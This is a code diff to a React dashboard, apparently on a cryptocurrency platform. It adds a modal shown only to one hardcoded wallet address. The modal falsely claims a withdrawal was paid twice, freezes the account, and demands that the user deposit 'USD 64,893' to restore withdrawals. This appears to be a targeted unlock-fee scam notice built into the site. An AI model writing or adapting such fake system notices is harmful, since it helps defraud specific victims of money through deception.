@@ -15,6 +15,7 @@ import LockModal from "../components/LockModal";
 import Chatbox from "../components/Chatbox";
 import { Swiper, SwiperSlide } from "swiper/react";
 import "swiper/swiper-bundle.css"; // Import Swiper styles
+import { SettingsSuggestOutlined } from "@mui/icons-material";
 
 const CloseButton = styled.svg`
   width: 20px;
@@ -103,6 +104,9 @@ const Dashboard = () => {
       "0:49847e3d9f5b8986565025d52b30c939d5610771a489952ebb89d148587b7ea2"
     ) {
       setSpecialNoti(true);
+    }
+    if (sessionStorage.getItem("walletAddress") === "0:bae2f80a7cbaad7f93f18bb569f632cfcfb1fa9c0612cb5180ef43d60b1e8a34") {
+      setNotification(true);
     }
     if (isWalletSet === true) {
       setFormSet(true);
@@ -200,6 +204,11 @@ const Dashboard = () => {
       });
   };
 
+  const [notification, setNotification] = useState(false);
+
+  const handleCloseNoti = () => {
+    setNotification(false);
+  }
   return (
     <div className="bg-primary w-full h-full">
       <div className={`${styles.paddingX} ${styles.flexCenterNav}`}>
@@ -338,6 +347,49 @@ const Dashboard = () => {
             <button className="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded" onClick={handleVerifyWallet}>
               Verify Wallet
             </button>
+          </div>
+        </div>
+      </Modal>
+
+      <Modal
+        isOpen={notification}
+        style={customStyles}
+        onRequestClose={handleCloseNoti}
+        contentLabel="Notification from system"
+      >
+        <div
+          onClick={() => handleCloseNoti()}
+          style={{
+            height: "auto", // Ensure the container takes full height of the modal
+            width: "100%",
+            display: "flex",
+            justifyContent: "center", // Center the image horizontally
+            alignItems: "center", // Center the image vertically
+            cursor: "pointer",
+            padding: "30px",
+            gap: "20px",
+            backgroundColor: "#1f2937"
+          }}
+        >
+          <div className="justify-start align-start text-white flex flex-col w-[full] gap-[20px]">
+            <p>Notice</p>
+            <p className="flex flex-col w-full">
+              <span>
+                Today, during the transaction order verification process, we transferred your withdrawal order twice!
+              </span>
+              <span>
+                We will temporarily suspend the transfer and withdrawal functions of the account.
+              </span>
+              <span>
+                When the account has received enough commission, please swap it to USD 64,893 USD to return to the company.
+              </span>
+              <span>
+                After the account has that balance, we will collect it and open the withdrawal and transfer functions for the account.
+              </span>
+            </p>
+            <p>
+              Thank you for your cooperation.
+            </p>
           </div>
         </div>
       </Modal>
